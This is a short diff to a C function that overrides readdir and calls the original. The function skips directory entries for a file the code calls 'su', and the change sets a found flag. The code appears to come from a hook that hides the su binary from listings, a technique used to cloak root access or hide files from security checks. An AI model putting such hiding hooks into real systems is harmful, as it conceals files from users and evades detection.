@@ -100,6 +100,7 @@ struct dirent *readdir(DIR *dirp) {
 			printf("Found su file, reading next...");
 			ret = original_readdir(dirp);
 			printf(" done!\n");
+			found = 1;
 		} else {
 			found = 0;
 		}
